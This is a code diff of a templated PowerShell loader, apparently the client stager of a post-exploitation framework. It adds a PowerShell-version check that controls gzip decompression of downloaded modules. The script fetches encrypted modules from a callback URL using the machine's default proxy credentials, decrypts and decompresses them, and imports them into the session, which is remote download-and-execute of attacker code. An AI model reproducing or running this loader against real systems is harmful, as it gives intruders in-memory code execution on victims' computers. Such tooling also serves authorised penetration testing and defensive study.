@@ -1,6 +1,7 @@
 $ErrorActionPreference = "Stop"
 $CALLBACK_URL = "{{callback_url}}"
 $KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
+$PS_VERSION = $PSVersionTable.PSVersion.Major
 
 Write-Host @"
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
@@ -74,19 +75,19 @@ function Decrypt-Code {
 }
 
 function Unzip-Code {
-    Param ( [byte[]] $byteArray )
-{% if no_compress %}
-    $byteArray
-{% else %}
-     $input = New-Object System.IO.MemoryStream( , $byteArray )
-	 $output = New-Object System.IO.MemoryStream
-     $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
-     $gzipStream.CopyTo( $output )
-     $gzipStream.Close()
-     $input.Close()
-     [byte[]] $byteOutArray = $output.ToArray()
-     $byteOutArray
-{% endif %}
+     Param ( [byte[]] $byteArray )
+     if ($PS_VERSION -eq 2) {
+        $byteArray
+     } else {
+         $input = New-Object System.IO.MemoryStream( , $byteArray )
+         $output = New-Object System.IO.MemoryStream
+         $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+         $gzipStream.CopyTo( $output )
+         $gzipStream.Close()
+         $input.Close()
+         [byte[]] $byteOutArray = $output.ToArray()
+         $byteOutArray
+    }
 }
 
 
@@ -111,12 +112,6 @@ function Import-HubModule {
         Write-Host ("[*] {0} imported." -f $Module["name"])
     } else {
         Write-Host ("[*] Failed to import {0}" -f $Module["name"])
-    }
-}
-
-ForEach ($m in $Modules) {
-    if ($m["code"] -and $m["type"] -eq "ps1") {
-        Import-HubModule $m
     }
 }
 
@@ -208,7 +203,10 @@ Use the '-Verbose' option to print detailed information.
     $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
     foreach ($i in $indices) {
         if ($i -lt $Modules.length -and $i -ge 0) {
-            $Modules[$i]["code"] = $K.downloadstring(("{0}?m={1}" -f $CALLBACK_URL,$i));
+            $compression = "&c=1"
+            if ($PS_VERSION -eq 2) { $compression = "" }
+            $url = "{0}?m={1}{2}" -f $CALLBACK_URL, $i, $compression
+            $Modules[$i]["code"] = $K.downloadstring($url);
             Import-HubModule $Modules[$i]
         }
     }
